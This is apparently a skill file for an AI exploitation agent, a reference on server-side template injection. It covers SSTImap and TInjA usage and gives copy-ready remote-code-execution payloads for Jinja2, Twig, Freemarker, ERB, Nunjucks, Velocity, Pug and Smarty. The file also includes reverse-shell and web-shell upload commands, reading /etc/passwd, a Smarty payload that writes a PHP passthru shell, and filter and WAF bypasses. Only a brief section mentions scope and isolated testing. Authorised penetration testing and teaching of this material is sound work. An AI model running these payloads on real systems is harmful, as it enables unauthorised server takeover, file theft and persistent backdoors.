---
name: ssti-poc
category: exploit
tags:
  - ssti
  - template-injection
  - jinja2
  - twig
  - freemarker
  - rce
triggers:
  - ssti vulnerability
  - server side template injection
  - template injection
  - jinja2 injection
  - twig injection
agent: exploit
os: cross-platform
---

# SSTI-POC

## Purpose

Exploit Server-Side Template Injection (SSTI) vulnerabilities to achieve Remote Code Execution. SSTI occurs when user input is unsafely embedded into server-side templates, allowing attackers to inject template expressions that execute on the server.

## Tools

### SSTImap (Primary)

- **Description**: Automatic SSTI detection and exploitation (Python 3)
- **GitHub**: https://github.com/vladko312/SSTImap
- **Version**: 1.3.x (actively maintained)

### tplmap (Legacy)

- **Description**: Original SSTI exploitation tool (Python 2)
- **GitHub**: https://github.com/epinna/tplmap
- **Note**: No longer maintained, use SSTImap instead

### TInjA

- **Description**: Efficient SSTI + CSTI scanner with polyglots
- **GitHub**: https://github.com/Hackmanit/TInjA

## Installation

### SSTImap Installation

```bash
# Clone repository
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap

# Install dependencies
pip install -r requirements.txt

# Run
python3 sstimap.py --help
```

### TInjA Installation

```bash
# Download latest release
go install github.com/Hackmanit/TInjA@latest

# Or via Docker
docker pull hackmanit/tinja
```

## CLI Reference

### SSTImap Options

```
Target:
  -u URL              Target URL with injection point (use * as marker)
  -r FILE             Load request from file

Request:
  -d DATA             POST data
  -H HEADER           Custom header (can repeat)
  -c COOKIE           Cookie string
  -A USER_AGENT       Custom User-Agent
  -m METHOD           HTTP method (GET/POST)
  --proxy PROXY       Use proxy (http://host:port)

Detection:
  -l LEVEL            Detection level 1-5 (default: 1)
  -e ENGINE           Force specific engine
  -t TECHNIQUE        Force technique (R/E/B/T)
  --generic           Test generic templates

Exploitation:
  --os-shell          Interactive OS shell
  --os-cmd CMD        Execute OS command
  --eval-shell        Interactive eval shell
  --eval-cmd CODE     Evaluate code
  --tpl-shell         Interactive template shell
  --tpl-cmd CODE      Inject template code
  --bind-shell PORT   Bind shell on target
  --reverse-shell H P Reverse shell to attacker
  --upload L R        Upload local to remote
  --download R L      Download remote to local

Mode:
  -i                  Interactive mode
  -s                  Skip initial test, assume injectable
```

## Supported Template Engines

### By Language

| Language   | Engines                          |
| ---------- | -------------------------------- |
| Python     | Jinja2, Mako, Tornado, Cheetah   |
| PHP        | Twig, Smarty                     |
| Java       | Freemarker, Velocity, OGNL, SpEL |
| JavaScript | Nunjucks, Pug, doT, EJS, Marko   |
| Ruby       | ERB, Slim                        |

### Capabilities Matrix

```
Engine          | Shell | Bind/Rev | File R/W | Eval |
----------------|-------|----------|----------|------|
Jinja2          |   ✓   |    ✓     |    ✓     |  ✓   |
Twig (<=1.19)   |   ✓   |    ✓     |    ✓     |  ✓   |
Freemarker      |   ✓   |    ✓     |    ✓     |  ✓   |
ERB             |   ✓   |    ✓     |    ✓     |  ✓   |
Nunjucks        |   ✓   |    ✓     |    ✓     |  ✓   |
Twig (>1.19)    |   ✗   |    ✗     |    ✗     |  ✗   |
Smarty (secure) |   ✗   |    ✗     |    ✗     |  ✗   |
```

## Detection Techniques

### Polyglot Payload

Universal payload to trigger errors in SSTI:

```
${{<%[%'"}}%\.
```

### Rendered Detection

Use mathematical expressions:

```
{{7*7}}        → 49 (Jinja2)
${7*7}         → 49 (Freemarker)
#{7*7}         → 49 (Thymeleaf)
<%= 7*7 %>     → 49 (ERB)
*{7*7}         → 49 (SpEL)
{7*7}          → 49 (Velocity)
{{= 7*7 }}     → 49 (doT)
```

### Error-Based Detection

```
# Trigger division by zero with property access
(1/0).zxy.zxy
```

Error response identifies language:

- `ZeroDivisionError` → Python
- `java.lang.ArithmeticException` → Java
- `ReferenceError` → NodeJS
- `Division by zero` → PHP
- `divided by 0` → Ruby

### Boolean-Based Detection

```
# Pair 1 - valid vs syntax error
(3*4/2) vs 3*)2(/4

# Pair 2 - valid vs syntax error
((7*8)/(2*4)) vs 7)(*)8)(2/(*4
```

## SSTImap Workflows

### Basic Detection

```bash
# Test URL parameter
python3 sstimap.py -u 'http://target.com/page?name=test'

# Test POST parameter
python3 sstimap.py -u 'http://target.com/page' -d 'name=test'

# Test with marker
python3 sstimap.py -u 'http://target.com/page?name=INJECT*HERE'
```

### Interactive Mode

```bash
# Enter interactive mode
python3 sstimap.py -i -u 'http://target.com/page?name=test'

# Commands in interactive mode:
# url <URL>        - Set target URL
# run              - Run detection
# os-shell         - Get OS shell
# eval-shell       - Get eval shell
# help             - Show all commands
```

### Exploitation

```bash
# Get OS shell
python3 sstimap.py -u 'http://target.com/?name=test' --os-shell

# Execute single command
python3 sstimap.py -u 'http://target.com/?name=test' --os-cmd 'id'

# Reverse shell
python3 sstimap.py -u 'http://target.com/?name=test' \
  --reverse-shell 10.10.10.10 4444

# File operations
python3 sstimap.py -u 'URL' --download /etc/passwd passwd.txt
python3 sstimap.py -u 'URL' --upload shell.php /var/www/shell.php
```

## Manual Payloads by Engine

### Jinja2 (Python)

```python
# Detection
{{7*7}}
{{config}}
{{self.__class__.__mro__}}

# RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# File read
{{ ''.__class__.__mro__[1].__subclasses__()[104]().load_module('os').popen('cat /etc/passwd').read() }}
```

### Twig (PHP)

```php
# Detection
{{7*7}}
{{_self}}
{{_self.env}}

# Twig <=1.19 RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig >=1.41, >=2.10, >=3.0
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}

# File read
{{'cat /etc/passwd'|filter('system')}}
```

### Freemarker (Java)

```java
# Detection
${7*7}
${.version}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}

# File read
<#assign file=object.getClass().forName("java.io.File")>
<#assign fis=object.getClass().forName("java.io.FileInputStream")>
```

### ERB (Ruby)

```ruby
# Detection
<%= 7*7 %>
<%= self %>

# RCE
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>

# File read
<%= File.open('/etc/passwd').read %>
```

### Nunjucks (JavaScript)

```javascript
# Detection
{{7*7}}
{{range(5)}}

# RCE
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

# Alternative
{{constructor.constructor("return this.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### Velocity (Java)

```java
# Detection
#set($x=7*7)$x
$class.inspect('java.lang.Runtime')

# RCE
#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
#set($cmd = $runtime.exec("id"))
$cmd.waitFor()
#set($is = $cmd.getInputStream())
```

### Pug (JavaScript)

```javascript
# Detection
#{7*7}

# RCE
-var x = root.process
-x = x.mainModule.require
-x = x('child_process')
=x.execSync('id')
```

### Smarty (PHP)

```php
# Detection
{$smarty.version}
{7*7}

# RCE (unsecured only)
{system('id')}
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
```

## Filter Bypass Techniques

### Jinja2 Bypasses

```python
# Bypass dot filter
{{ config['__class__'] }}
{{ config|attr('__class__') }}

# Bypass underscore filter
{{ ''['\x5f\x5fclass\x5f\x5f'] }}
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}

# Bypass quotes
{{ config[request.args.param1] }}

# Join filter bypass
{{ [''|attr(request.args.a),''|attr(request.args.b)]|join }}
```

### Generic Bypasses

```
# Case variations
{{7*7}} vs {{7*'7'}}

# String concatenation
{{ 'c'+'at /etc/passwd' }}

# Hex encoding
{{ '\x69\x64' }}  # 'id'
```

## TInjA Usage

```bash
# Basic scan
tinja url -u "http://target.com/?name=test"

# With authentication
tinja url -u "http://target.com/?name=test" -H "Authorization: Bearer TOKEN"

# POST request
tinja url -u "http://target.com/" -d "username=test"

# With cookies
tinja url -u "http://target.com/?name=test" -c "PHPSESSID=abc123"
```

## Common Injection Points

```
# URL parameters
/page?name=INJECT
/search?q=INJECT
/template?tpl=INJECT

# POST body
username=INJECT
email=INJECT
message=INJECT

# Headers
User-Agent: INJECT
Referer: INJECT

# Files
PDF generators (invoice templates)
Email templates
Error pages
```

## Troubleshooting

| Issue                  | Solution                 |
| ---------------------- | ------------------------ |
| No injection found     | Try higher level (-l 5)  |
| Engine not detected    | Use --generic flag       |
| Sandbox blocks exploit | Try filter bypasses      |
| Limited capabilities   | Check engine version     |
| WAF blocking           | Use encoding/obfuscation |
| Blind injection        | Use time-based technique |

## Security Considerations

- SSTI can lead to full server compromise
- Document all RCE attempts carefully
- Test in isolated environments when possible
- Some payloads may crash the application
- Verify scope includes template testing
- Report sandbox escapes separately

## References

- SSTImap: https://github.com/vladko312/SSTImap
- tplmap: https://github.com/epinna/tplmap
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- James Kettle Research: https://portswigger.net/research/server-side-template-injection
